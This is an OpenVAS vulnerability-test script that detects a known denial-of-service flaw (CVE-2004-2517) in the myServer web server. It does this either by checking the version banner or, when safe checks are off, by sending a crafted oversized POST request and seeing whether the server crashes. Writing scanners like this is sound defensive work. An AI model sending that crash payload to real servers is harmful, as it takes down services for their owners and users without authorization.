# OpenVAS Vulnerability Test
# $Id: myserver_post_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: myServer POST Denial of Service
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running myServer, an open-source http server.
This version is vulnerable to remote denial of service attack.

With a specially crafted HTTP POST request, an attacker can cause the service 
to stop responding.";

tag_solution = "Upgrade to the latest version of this software or use another web server";

#  Ref: badpack3t <badpack3t@security-protocols.com> for .:sp research labs:.

if(description)
{
 script_id(14838);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_xref(name:"OSVDB", value:"10333");
 script_cve_id("CVE-2004-2517");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 name = "myServer POST Denial of Service";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Test POST DoS on myServer";
 script_summary(summary);
 
 script_category(ACT_MIXED_ATTACK);

 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Web application abuses";
 script_family(family);
 
 script_dependencies("find_service.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if(!banner) exit(0);
 if ( "MyServer" >!< banner ) exit(0);

 if (safe_checks())
 {
 	#Server: MyServer 0.7.1
 	if(egrep(pattern:"^Server: *MyServer 0\.([0-6]\.|7\.[0-1])[^0-9]", string:banner))
        {
          security_warning(port);
        }
   exit(0);
 }
 else
 {
   if(http_is_dead(port:port))exit(0);
   data = http_post(item:string("index.html?View=Logon HTTP/1.1\r\n", crap(520), ": ihack.ms\r\n\r\n"), port:port); 
   soc = http_open_socket(port);
   if(soc > 0)
   {
    send(socket:soc, data:data);
    http_close_socket(soc);
    sleep(1);
    soc2 = http_open_socket(port);
    if(!soc2)
    {
	security_warning(port);
    }
    else http_close_socket(soc2);
   }
 }
}
